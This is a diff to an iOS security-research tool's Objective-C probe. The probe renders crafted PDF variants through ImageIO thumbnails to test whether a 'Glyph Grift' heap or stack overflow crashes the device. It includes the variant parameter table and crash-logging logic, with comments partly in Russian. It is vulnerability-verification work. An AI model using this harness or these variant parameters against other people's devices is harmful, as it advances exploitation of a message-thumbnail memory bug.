@@ -795,14 +795,38 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
 
 + (NSString *)glyphGriftProbeReport {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5h: Glyph Grift empirical test (CVE-2026-86950 class) ===\n"];
-    scopeNote(r, @"  trigger: trigger.pdf (Calif PoC, DX=33 heap-OOB variant)");
-    scopeNote(r, @"  path: ImageIO thumbnail (WhatsApp/iMessage)");
-    scopeNote(r, @"  !!! если баг жив — процесс паникует. Паника = ПОДТВЕРЖДЕНИЕ !!!");
+    [r appendString:@"\n=== R5i: Glyph Grift variant sweep (one per run) ===\n"];
 
-    NSString *path = [[NSBundle mainBundle] pathForResource:@"trigger" ofType:@"pdf"];
+    // Static cursor — one variant per invocation so a crash identifies itself.
+    static int gGlyphIdx = 0;
+    const char *names[8] = { "g1", "g2", "g3", "g4", "g5", "g6", "g7", "g8" };
+    const char *desc[8] = {
+        "tx32000 dx31 n9  STACK (width_px 992)",
+        "tx32000 dx32 n9  HEAP  (width_px 1024)",
+        "tx32000 dx64 n9  HEAP  (width_px 2047)",
+        "tx32000 dx32 n8  HEAP  (width_px 512, half dev_x)",
+        "tx32000 dx32 n10 HEAP  (width_px 2047, double dev_x)",
+        "tx16000 dx32 n9  HEAP  (half trigger_x)",
+        "tx24000 dx32 n9  HEAP  (mid trigger_x)",
+        "tx32000 dx16 n9  STACK (small buffer)",
+    };
+    int idx = gGlyphIdx % 8;
+    gGlyphIdx++;
+
+    scopeNote(r, [NSString stringWithFormat:@"  VARIANT [%d] %s : %s", idx, names[idx], desc[idx]]);
+    scopeNote(r, @"  !!! если паника — panic log + эта строка = какой вариант сработал !!!");
+    // Flush before the render so the log survives a crash.
+    [[KPLog shared] append:[NSString stringWithFormat:@"[R5i] rendering variant %s (%s)\n", names[idx], desc[idx]]];
+    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-glyphgrift.txt"];
+    NSString *line = [NSString stringWithFormat:@"VARIANT %d %s %s\n", idx, names[idx], desc[idx]];
+    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
+    if (!fh) { [line writeToFile:logPath atomically:NO encoding:NSUTF8StringEncoding error:nil]; }
+    else { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
+
+    NSString *name = [NSString stringWithFormat:@"%s", names[idx]];
+    NSString *path = [[NSBundle mainBundle] pathForResource:name ofType:@"pdf"];
     if (!path) {
-        scopeNote(r, @"  trigger.pdf не найден в bundle — skip");
+        scopeNote(r, [NSString stringWithFormat:@"  %@.pdf not in bundle — skip", name]);
         return r;
     }
     scopeNote(r, [NSString stringWithFormat:@"  file: %@", path]);
@@ -813,7 +837,7 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
         scopeNote(r, @"  CGImageSourceCreateWithURL failed");
         return r;
     }
-    scopeNote(r, @"  image source created — starting thumbnail render…");
+    scopeNote(r, @"  source created — rendering thumbnail (this is the danger zone)…");
 
     int sz = 256;
     CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
@@ -824,17 +848,16 @@ static int kpncRemoveFlow(int fd, const uint8_t *flow) {
         &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
 
     CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
-    // If we get here, no panic — the vulnerable path did not fire.
-    scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p (null? %d)",
-                  (void *)img, img == NULL]);
+    scopeNote(r, [NSString stringWithFormat:@"  SURVIVED variant %d (%s). img=%p",
+                  idx, desc[idx], (void *)img]);
     if (img) CGImageRelease(img);
     CFRelease(opts);
     CFRelease(szRef);
     CFRelease(src);
 
     [r appendString:@"\n--- verdict ---\n"];
-    scopeNote(r, @"  No panic → aa_* sat/trunc mismatch NOT present (or not reached).");
-    scopeNote(r, @"  Если паникнуло — смотри panic log: aa_cache_render = баг жив на 18.6.");
+    scopeNote(r, @"  No panic → этот вариант не сработал. Запусти ещё раз для следующего.");
+    scopeNote(r, @"  Паника → смотри kexproof-r5h-glyphgrift.txt: какая VARIANT шла последней.");
     return r;
 }
 
